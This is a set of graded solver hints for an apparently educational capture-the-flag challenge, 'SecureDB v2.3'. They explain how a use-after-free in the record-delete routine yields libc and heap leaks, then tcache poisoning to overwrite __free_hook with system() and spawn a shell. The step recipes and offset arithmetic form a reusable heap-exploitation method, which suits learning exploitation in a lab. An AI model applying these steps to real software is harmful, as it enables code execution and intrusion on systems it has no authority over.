# SecureDB v2.3 – Solver Hints
# ============================
# Hints are written in increasing order of detail.
# Read only as many as you need!
#
# Recommended tooling:
#   pwntools, gdb-pwndbg (or gdb-peda), ROPgadget
#   Ubuntu 20.04 with the provided libc.so.6 / ld-2.31.so

═══════════════════════════════════════════════════════════════
  HINT 1  ─  The Bug: What is this program actually doing?
═══════════════════════════════════════════════════════════════

Look carefully at cmd_del() and compare it to a textbook-correct
"delete" implementation.  Ask yourself:

  1. After the two free() calls, what is still stored in db[id]?

  2. validate_id() is used by EVERY other command (show, write, read).
     What condition does it check?  Under what circumstances does it
     return "true" for an id that has already been deleted?

  3. Experiment: create a record, delete it, then call "read" on the
     same id.  The program should reject this – but does it?
     What do you see in the hex dump?  Those are not your bytes.

  4. Now think about what the glibc heap allocator stores at the very
     beginning of a freed chunk's user-data region.  Look up:
       - tcache (thread-local free list, glibc ≥ 2.26)
       - unsorted bin
     The allocator is reusing freed memory for its own bookkeeping.
     You are reading that bookkeeping data.

  Takeaway: the program has a classical Use-After-Free (UAF).
  Three primitives follow from it:
    • UAF read  – cmd_read()  on a deleted record
    • UAF write – cmd_write() on a deleted record
    • UAF call  – cmd_show()  on a deleted record (function pointer)


═══════════════════════════════════════════════════════════════
  HINT 2  ─  Information Leaks: getting libc base and heap base
═══════════════════════════════════════════════════════════════

You need two addresses before you can write anywhere useful:
  (a) libc base   → lets you compute __free_hook, system(), etc.
  (b) heap base   → lets you understand the current heap layout

── (a) Libc leak via unsorted bin ──────────────────────────────

glibc's tcache only handles chunks up to a certain size
(TCACHE_MAX = chunk size 0x410, i.e. malloc(≤ 0x400)).
For larger allocations, freed chunks go into the UNSORTED BIN
and glibc writes a pointer to main_arena into the chunk's fd/bk:

    freed_chunk->fd = freed_chunk->bk = &main_arena.bins[0]
                    = libc_base + <fixed offset>

Recipe:
  1. new("A", 0x500)   ← malloc(0x500); chunk 0x510 > tcache max
  2. new("fence", 0x10) ← prevents top-chunk consolidation
  3. delete(id_A)       ← data_A freed → unsorted bin
  4. read(id_A)         ← UAF: first 8 bytes = libc pointer!

  libc_base = leaked_ptr - offsetof(__malloc_hook) - 0x10 - 96

  The "- 96" is because main_arena.bins[0] is 96 bytes into main_arena,
  and main_arena = __malloc_hook + 0x10.
  (Verify the 96 with: gdb → p (char*)leaked_ptr - (char*)&main_arena)

── (b) Heap leak via tcache chain ──────────────────────────────

When two chunks of the SAME size are freed, the second freed chunk's
fd points to the first freed chunk (tcache is a LIFO stack):

    free(data_X)   →  tcache: data_X (fd=NULL)
    free(data_Y)   →  tcache: data_Y (fd=data_X) ← heap pointer!

Recipe:
  1. new("h1", 0x28)   → id_h1
  2. new("h2", 0x28)   → id_h2
  3. delete(id_h2)     ← data_h2 → tcache[0x30], fd=NULL
  4. delete(id_h1)     ← data_h1 → tcache[0x30], fd=data_h2
  5. read(id_h1)       ← UAF: first 8 bytes = data_h2 address!

  NOTE: delete() also frees the Record STRUCT (chunk 0x40).
  Track both bins separately:
    tcache[0x30] = data buffers for size 0x28
    tcache[0x40] = Record structs


═══════════════════════════════════════════════════════════════
  HINT 3  ─  Heap Feng Shui + Tcache Poisoning → RCE
═══════════════════════════════════════════════════════════════

Goal: overwrite __free_hook with system().
Then delete a record whose data = "/bin/sh\0" → free() → shell.

── Understanding the heap state ────────────────────────────────

After Hints 1 & 2 you have freed records id_h1 and id_h2.
The tcache state at that point (assuming they were the only size-0x28
records freed, and records 0..3 have been used):

  tcache[0x30]:  data_h1 → data_h2 → NULL          (count = 2)
  tcache[0x40]:  Record_h1 → Record_h2 → Record_A  (count = 3)

Draw this out on paper.  Every call to new() will consume ONE entry
from tcache[0x30] (data buffer) AND ONE from tcache[0x40] (struct).
You must account for BOTH.

── Tcache poisoning recipe (glibc 2.31, no safe-linking) ────────

glibc 2.31 does NOT encrypt tcache fd pointers (safe-linking was
added in 2.32).  This means the "next" pointer inside a freed chunk
is a raw address that you can overwrite via the UAF write primitive.

Step-by-step:

  1. You need tcache[0x30] to be:  data_h1 → data_h2 → NULL
     (This is already true after Hint 2.)

  2. UAF write on id_h1:
       write(id_h1,  p64(__free_hook - 8))
     This overwrites data_h1's fd pointer.
     tcache[0x30] is now:  data_h1 → (__free_hook - 8) → ???

  3. new("dummy", 0x28)  ← pops data_h1 from tcache (safe)
     tcache[0x30] is now:  (__free_hook - 8) → ???

  4. new("alias", 0x28)  ← pops __free_hook - 8 ← ARBITRARY ALLOC!
     This record's data buffer now points to __free_hook - 8.

  WHY __free_hook - 8 instead of __free_hook directly?
  cmd_new() calls memset(data, 0, size) right after malloc.
  If data = __free_hook, that memset zeros __free_hook (fine, it's NULL)
  but also 0x28 bytes AFTER it, which may corrupt neighboring libc
  globals.  Landing 8 bytes before is safer: the 8 bytes before
  __free_hook are BSS padding (zero), and memset zeroing them is a no-op.

  5. write(id_alias, b"\x00"*8 + p64(system))
     The first 8 bytes land at __free_hook - 8 (harmless padding).
     The next 8 bytes land at __free_hook = system().

  6. new("sh", 0x28)   → fresh record, data = fresh heap chunk
     write(id_sh, b"/bin/sh\x00")

  7. delete(id_sh)
     → free(data_sh)
     → __free_hook(data_sh)         ← __free_hook = system
     → system("/bin/sh")
     → ★ SHELL ★

── Sanity checks / common mistakes ─────────────────────────────

  ✗ "The exploit crashes inside malloc"
    → You likely corrupted the tcache count or the tcache struct header.
      Verify the exact number of entries in tcache[0x30] before poisoning
      (should be exactly 2) and that you're writing p64(target) not p64(target)+newline.
      Use read_raw() / pwntools sendafter(), NOT sendline().

  ✗ "libc base ends in non-zero nibble"
    → The UNSORTED_OFF constant (96) is wrong for your libc build.
      Run: python3 -c "from pwn import *; print(hex(ELF('./libc.so.6').sym['__malloc_hook']))"
      Then in gdb: p (char*)0x<leaked> - (char*)&main_arena
      and use that offset instead.

  ✗ "system() address looks wrong"
    → Make sure libc.address is set BEFORE reading libc.sym['system'].
      pwntools resolves symbols lazily.

  ✗ "new() can't find an empty slot after deletions"
    → The db[] array uses a monotone counter (db_next), not a free-list scan.
      You have 16 total slots.  Count your allocations.

  ✓ Full exploit needs at most 7 records (ids 0–6).

── Quick reference: struct layout for exploit arithmetic ────────

  Record struct (0x38 bytes → chunk 0x40):
    +0x00  name[24]    ← tcache fd overwrites here when freed
    +0x18  is_live
    +0x1c  _reserved
    +0x20  data_len    ← NOT overwritten by tcache (offset > 0x10)
    +0x28  data*       ← NOT overwritten by tcache; still valid after free!
    +0x30  display*    ← UAF call target (via cmd_show)

  After free(record): offsets 0x00 and 0x08 hold tcache fd / key.
  Offsets 0x10+ retain their original values until reallocated.
  This is why UAF read/write works: data_len and data* are intact.
